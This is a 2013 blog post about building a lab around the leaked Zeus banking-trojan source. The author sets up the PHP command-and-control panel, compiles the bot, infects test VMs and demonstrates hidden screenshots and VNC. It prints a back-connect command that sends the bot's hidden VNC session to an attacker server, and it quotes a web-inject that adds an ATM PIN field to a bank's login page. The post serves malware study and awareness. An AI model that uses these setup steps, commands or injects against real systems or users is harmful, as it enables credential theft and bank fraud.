---
categories:
- zeus
- bot
- lab
comments: true
date: 2013-09-23T00:00:00Z
published: true
title: Zeus My Adventure with a Infamous Bot
---

**NOTE! THIS IS FOR EDUCATIONAL PURPOSES ONLY. CHANCES ARE, IF YOU TRY THIS WITHOUT PERMISSION, YOU WILL GET CAUGHT AND GET THROWN INTO A DARK PLACE WITH NO INTERNET**

### Bots for the masses.
Recently at a conference that I attended, I sat in a class that was talking about Botnets and general 'How Easy They Are' related things. 90% of the technical discussions did not really come as a surprise to me, however, I came to realize that I am not **100%** aware of how ( and I dare say this lightly ) *easy* they have it. The technical competency of the adversary really doesn't have to be at a jaw droppingly high level. In fact, if you can operate the keyboard and mouse, heck, even a tablet/phone once its all setup, then you could potentially be a successful botnet operator.

<!--more-->

### So, botnet?
In its simplest form, a bot, from an attackers perspective, is simply a part of a larger resource network. A number, that if not available, does not really matter as there are many more that form part of the larger botnet. A very well known botnet is the [Zeus botnet](https://en.wikipedia.org/wiki/Zeus_(malware\)). Popular for its ability to perform credential theft, it was sold from what appears to range from $700 to $15000, depending on the extra *features* that you'd like. Some of these features include the ability to connect via VNC to a remote host in order to graphically control it.

So for $700, you can buy a relatively easy to setup piece of software that would allow you to *steal* credentials from random victims. This activity is only one part of a larger cybertheft cycle. The wikipedia article [here](https://en.wikipedia.org/wiki/Zeus_(malware\)) does a excellent job to describe the process in a image:

{{< figure src="/images/zues_fraud_scheme.jpg" >}}

### The Zeus Bot Architecture
The Zeus bot client side software is a windows only piece of malware. Typically infection would occur via a [drive-by download](http://en.wikipedia.org/wiki/Drive-by_download) (which is the scariest and possibly most stealthy form of infection), or via other means such as facebook posts, phishing sites etc, enticing the user to run an arbitrary executable. Of course, infection is not limited to these methods. Simply getting access to a computer, plugging in your thumbdrive and running the bot software is a completely valid form of infection.

Once infection is successful, the client runs silently on the victim PC, masking itself as much as possible. The client would have a time configured that tells it how often it should update the Command and Control server with new collected information, as well as dynamic configuration updates, new commands it should run and keep-alive check-ins.


### Zeus Source Leaked
The full Zeus bot sources [leaked](https://www.csis.dk/en/csis/blog/3229/) around March 2011, and a Github repo of it was made [here](https://github.com/Visgean/Zeus). This allowed any one in the public to dissect, inspect and test the Malware. This was probably not a good thing for the malware authors' business :). However, now, anyone is able to grab the sources, modify it as required and use. It leads to the possibility of even more sophistication in a already successful botnet, such as adding peer-to-peer communications with C&C servers instead of relying on HTTP as can be seen in [this](http://www.cert.pl/PDF/2013-06-p2p-rap_en.pdf) excellent analysis by [@CERT_Polska_en](https://twitter.com/CERT_Polska_en).


### LAB Time!
Now that we have the full sources, I decided it's time to setup a LAB to configure and play with this bot.

I have a KVM Server at my disposal, and figured it will be a good idea to use that. The basic idea of the lab was to have a simulated internet network, a firewall, and a client network that makes use of this "Fake Internet". I created 2 isolated networks, configured a set of CentOS 6, and Windows XP clients and a Server 2008 R2 Server.

In short, the lab was going to look something like this:
```bash

                         Virtual Machine Management Interface
                         +----------------------------------->
                                   |
                                   |
                                   |
                              +----+---------+
                              |              |
                  +-----------+  Firewall    +-----------+
                  |           |              |           |
                  |           +--------------+           |
                  |                                      |                 +----------+
                  |                  ^                   |              +--| Victim A |
          +---------------+          |           +----------------+     |  +----------+
          |               |          |           |                |     |
          | Fake Internet |          +           |   Fake LAN     +-----+  +----------+
          |               |                      |                |     +--+ Victim B |
          +------+--------+   NAT Towards Fake   +----------------+        +----------+
                 |            Internet Interface
                 |
        +--------+--------+--------------------+----------------+
        |                 |                    |                |
        |                 |                    |                |
        |                 |                    |                +
 +------+-----+     +-----+------+      +------+-------+     +-----------------+
 |            |     |            |      |              |     |                 |
 | Zeus Bot   |     | Zeus Web   |      | Random Victim|     | Compromised     |
 | Herder /   |     | based C&C  |      |              |     | Web Server      |
 | Controller |     |            |      |              |     |                 |
 +------------+     +------------+      +--------------+     +-----------------+
```

### The Configuration

#### Command & Control
I figured I'd start by checking out the code from the [git](https://github.com/Visgean/Zeus/) repo onto the server I would use as the command and control server. So, off I went and `git clone https://github.com/Visgean/Zeus.git`'d the Zeus code into a local directory of my C&C server.

The folder structure of the directory `output` that is of interest, on disk, looked something like this:

```bash
Zeus/output
├── builder
├── other
├── server
└── server[php]
    ├── install
    ├── system
    └── theme
```

We can see there is a `server[php]` directory, which is rather obvious that this is the web interface code. Quick inspection of the sources revealed that the common directory index `index.php` is in fact empty. So, should someone stumble upon the C&C directory, a blank page will be displayed to the user.

Two other files also exist in the php server root, namely `cp.php` and `gate.php`. `cp.php` is the user control panel to manage the bots, whereas `gate.php` is the script that all the bots will use to communicate with the C&C. That being said, inspecting network traffic should reveal a lot of talking with `gate.php`. As a side note, the comments in the sources are in Russian, which makes for a interesting time with Google Translate to read them ;)

So, I copied the sources for `server[php]` to a web folder `z/`, fixed up the SELinux contexts for them and tried to access the `cp.php` page. Bam, server error.

```bash
# Zeus cp.php mb_internal_encoding error
[Mon Sep 23 10:57:45 2013] [error] [client 172.16.50.1] PHP Fatal error:  Call to undefined function mb_internal_encoding() in /var/www/html/z/system/global.php on line 1
```

It was pretty obvious I was missing `php-mbstring`, so I went and installed it and restarted Apache. Now, loading my `cp.php`, I was greeted with a polite message asking me how I am :D

{{< figure src="/images/zues_cp.png" >}}

#### Installing the Command & Control
I noticed a install folder in the obtained sources and browsed to `install/` and found a very nice, easy to understand installer:

{{< figure src="/images/zues_cp_install.png" >}}

Here I realized I needed to have a mysql server running, so I proceeded to install that too and create a database `cpdb` for the control panel. From here, it was literally a case of install and login. We now have a working Zeus command and control server. That really was not so hard was it? In fact, its worryingly easy.

{{< figure src="/images/zues_cp_internal.png" >}}

#### Compiling the Bot

With that out of the way, the next step had to be to compile the Zeus bot binary with which we will be infecting the Lab of fake LAN clients. For this a Windows machine was required as the tools for this are all windows based. I fired up a Windows XP Virtual Machine, and grabbed a copy of the Zeus code from the Github repository again.

Next, I browsed to the `output/builder/` folder again and opened the `config.txt` file in notepad. Here, I really had to set minimal options. One to specify the location of the `config.bin` and the others for the location of updated bot binaries and what URL the Command and Control server lives at. All pretty straight forward. I also had to set the `encryption_key`, which should correspond to the key used when we installed the server side PHP stuff earlier.

{{< figure src="/images/zues_compiler_config.png" >}}

The next step was to *compile* the bot. While this may sound complex, it's not. In fact, 2 clicks, granted the config files syntax is correct, and you will have a working compiled exe to work with. The **compiler** interface looked like this:

{{< figure src="/images/zues_bot_compiler.png" >}}

1,2,3 done. We now have a `zeus-bot.exe`. The malware is now customized to speak to my Command & Control server using my unique encryption key. Again, up until this point everything has been pretty easy and straight forward.

### Skipping the creative parts - Infection.
From here the infection phase pretty much starts. Of course, the bot herder would need to test hes executables and ensure that they are in working order. There is no point in distributing malware that doesn't work eh. ;D With infection, as previously mentioned anything goes. From drive-by downloads to phishing to physical access to a server. If the machine can execute the bot executable, its job done.

Sadly, I wanted to test the [Blackhole Exploit Kit](http://en.wikipedia.org/wiki/Blackhole_exploit_kit), but the resources on the net appear to be rather scarce. That and the fact that the available versions of it are encoded using a PHP encoder (IonCube), makes it a tad more difficult to get going. It was however interesting to see that the malware authors are limiting they software to IP's along with time restrictions the works. Just like something you'd expect to see in commercial software.

As I am kind of the only person using this network, there is no point in trying to fool me into getting the executable run. To make it easy for me to rerun it, I uploaded `zeus-bot.exe` and the encrypted `config.bin` to a fake **compromised web server**, ready for download.

I opened Internet Explorer and browsed to the location of `zeus-bot.exe` and chose **RUN**. To the unsuspecting user, it will appear that nothing happened...

### From the Bot Herders Perspective
Assuming the position of the evil bot herder now, I am able to see that I have a new bot connected to my Command & Control server. We can see this in the interface, as well as based on the POST requests to `gate.php`

```bash
# Apache Logs Extract for POST's to gate.php
172.16.50.2 - - [19/Sep/2013:10:58:01 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:10:58:06 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:10:58:12 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:10:58:17 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:10:58:22 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:10:59:00 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:10:59:05 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:10:59:10 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:10:59:15 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:10:59:20 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:10:59:23 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:10:59:28 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:10:59:34 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:10:59:39 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:10:59:44 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:11:00:20 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:11:00:25 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:11:00:30 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:11:00:35 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:11:00:40 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:11:00:45 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:11:00:50 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:11:00:56 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:11:01:01 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:11:01:07 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:11:01:40 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:11:01:45 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:11:01:50 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
172.16.50.2 - - [19/Sep/2013:11:01:55 -0400] "POST /z/gate.php HTTP/1.1" 200 - "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
```

We are also able to, using the control panel, see some more information based on the newly connected bot:

{{< figure src="/images/zues_bot_zombie.png" >}}

An interesting thing to note here. It appears that the Zeus bot opens up a socks port on the client machines. If the Command & Control server is able to connect to this IP, and the socks port, then it will be able to pull a screenshot of the current state the client pc is in. This is an *almost live* image. On the client, we can see that the process `explorer.exe` is listening in port 35419. This is the same port that the web interface is reporting as the SOCKS port.

{{< figure src="/images/zues_bot_listener_port.png" >}}

In the case of my lab setup, this SOCKS connection was not possible due to the fact that the client is reporting as connected from 172.16.50.2, which is the fake, natted public ip of the lab firewall. The firewall itself is most certainly not listening on that port so the connection would fail. Maybe if I port forwarded the connection back into the fake LAN it would have been able to connect but this I did not test.

So, to test the screen-shotting features, I infected another client on the fake Internet, where the Command & Control server **will** be able to connect to. The result?

{{< figure src="/images/zues_bot_screenshot.png" >}}

There is **no** visual sign of this activity to the user. The user may be busy with some highly confidential work on hes workstation, unaware that an intruder is able to see what he is seeing. You know, like using that secret text file with all your passwords in it.

#### But thats not all
Just being able to *see* what the user sees is not really enough. No. You also have the ability to remotely VNC into the infected machine. By doing this, the attacker is able to remotely control your computer as you, with one difference, you won't know about it. So lets say he managed to successfully compromise your banking credentials. Instead of triggering alarms on the banks side that a login has just occurred on the other side of the globe, the attacker can now use **your** machine to steal **your** money. From the banks perspective this may appear like a perfectly legitimate transaction.

So lets see how this VNC functionality works.

#### Execute the VNC BC Script
First, the attacker will have to prepare a back connect server and then, via a script, tell the bot to connect to this server so that he may access the botted machine. This architecture is pretty solid. The only thing really that would stop an attacker from succeeding in setting up this back connect is if the remote firewall was to block the port that the attacker has set up on the back connect server. However, things like port 80, or even 443 is almost always opened, so these will be prime candidates to use.

In short, the setup will look something like this.

```bash
   -------------------------->        <--------------------------------------------
   -------------------------->        <--------------------------------------------

   +------------+      +-----------------------+  +--------------+   +------------------+
   |  Attacker  +------>  Back Connect Server  <--+ LAN Firewall <---+ Infected Machine |
   +------------+      +-----------------------+  +--------------+   +------------------+
```

The back connect server could be any host the attacker has access to and controls. This is also a great way for the attacker that wants to VNC to hide hes IP information. Should you on the infected machine realize what is going on, then you'd only see the connection going out to the back connect server, and not the real attacker. The server executable is `zsbcs.exe` in the `output/server/` directory and is a windows only tool.

Once the Back Connect Server is setup to listen on one port for new bots, and another for VNC client connections, the attacker would configure a script, instructing the clients where to connect. The script would look something like this:

```bash
bot_bc_add vnc 172.16.50.181 9000
```

This tells the bot where to connect to wait for a VNC session.

Next, the attacker can sit and watch hes Back Connect Server's output and see when a new bot has connected. He may now connect using hes VNC client to the client port of the back connect server and viola, VNC access. Alarmingly, the VNC access is not like your traditional VNC where the user will see the pointer move as the VNC user moves it. No, this VNC session starts in a separate **display**, ensuring that the user is still unaware of what is happening. This for me was the most alarming part. It's almost as if hes attaching to another *tty*.

{{< figure src="/images/zues_back_connect_vnc.png" >}}

### Web Injects, the real threat.
So all of this Remote Administration Stuff is cool. No doubt they are useful tools for an attacker, but this is not what has made Zeus what it is known for today. Zeus uses what is called **Web Injects** to manipulate website content. "What do you mean by 'manipulation'?" you may ask. Well, lets assume you are about to buy something online. Generally, the store would ask you for a Credit Card number and an expiry. Usually, on the next page you may be asked for the CVV number. With your machine infected with Zeus, the attacker is able to ask for your Credit Card Number, Expiry, CVV, Email Address, Address, Tel no., secret question etc etc all on one page. The page itself will look totally legit, and again, to the unsuspecting user, this may seem completely normal and away he goes entering hes details. Once submitted, Zeus captures the entire request, including the cookies, the POST data etc etc and based on the bots timer configurations, uploads this information to the Command & Control server. Just like the one we just used to Remotely Administer the infected machines.

With all this information, he may be able to return at a later stage, VNC to your computer and access your account to buy himself some new toys. Because he managed to get hold of your secret question, he finds no trouble in complying to any potential security checks the portal may bring.

#### How it works
When looking at the web injects, I guess the simplest way to describe them is similar to your favorite text editors search and replace features. With the Zeus bot hooked into some low level network API's in Windows, it is able to monitor for its configured URL's, and inject arbitrary content into the responses that are displayed in your browser. Lets take an example from the source [here](https://github.com/Visgean/Zeus/blob/translation/output/builder/webinjects.txt#L63).

```html
set_url https://www.wellsfargo.com/* G
data_before
<span class="mozcloak"><input type="password"*</span>
data_end
data_inject
<br><strong><label for="atmpin">ATM PIN</label>:</strong>&nbsp;<br />
<span class="mozcloak"><input type="password" accesskey="A" id="atmpin" name="USpass" size="13" maxlength="14" style="width:147px" tabindex="2" /></span>
data_end
data_after
data_end
```

In the above extract from the web injects we can see that the http**s**://wellsfargo.com (note the s) website will have a extra field added, asking for a *ATM PIN* before the password field. Now, an important thing to note here. Yes, a website owner could change the web sources which will make this web inject not work, however, the POST data will still be recorded for this watched URL and eventually stored on the C&C.

{{< figure src="/images/zues_web_inject_examples.png" >}}

### Summary
While Zeus itself is old news and many variants such as [Citadel](http://www.mcafee.com/us/resources/white-papers/wp-citadel-trojan.pdf) have sprung up, I believe this is still a very valid threat as the concepts remain the same.

A interesting thing about the bot. Zeus, once it infects a PC, will delete all the cookies in Internet Explorer. This is to force the user to re-login to the services he uses, and also lets Zeus grab them :)
